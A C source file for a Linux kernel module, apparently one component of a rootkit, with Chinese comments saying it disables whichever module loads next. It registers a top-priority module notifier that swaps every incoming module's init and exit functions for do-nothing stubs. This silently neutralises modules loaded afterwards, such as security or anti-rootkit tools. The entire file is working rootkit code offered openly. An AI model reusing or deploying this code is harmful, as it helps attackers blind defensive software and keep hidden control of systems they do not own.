#include "../header/hide.h"

// fake.c文件模块将会disable下一个正常注册的模块
// 让其无法正常发挥功效，转而执行fake_init和fake_exit函数
// 本质上是挂钩了mode_init和mode_exit函数
static int fake_init(void) {
    printk(KERN_INFO "fake_init lanuched.\n");
    return 0;
}

static void fake_exit(void) {
    printk(KERN_INFO "fake_exit ended\n");
    return ;
}


int my_notifier_call(struct notifier_block *nb, unsigned long action, void *data) {
    struct module *module;
    unsigned long flags;
    DEFINE_SPINLOCK(module_notifier_spinlock);

    module = data;
    printk(KERN_INFO "Processing the module: %s\n", module->name);

    spin_lock_irqsave(&module_notifier_spinlock, flags);
    switch (module->state) {
        case MODULE_STATE_COMING:
            printk(KERN_INFO "Replacing init and exit functions: %s.\n", module->name);
            module->init = fake_init;
            module->exit = fake_exit;
            break;
        default:
            break;
    }
    spin_unlock_irqrestore(&module_notifier_spinlock, flags);

    return NOTIFY_DONE;
}

struct notifier_block nb = {
    .notifier_call = my_notifier_call,
    .priority = INT_MAX,
};

void disable_module(void) {
    register_module_notifier(&nb);
}

void disable_module_exit(void) {
    unregister_module_notifier(&nb);
}
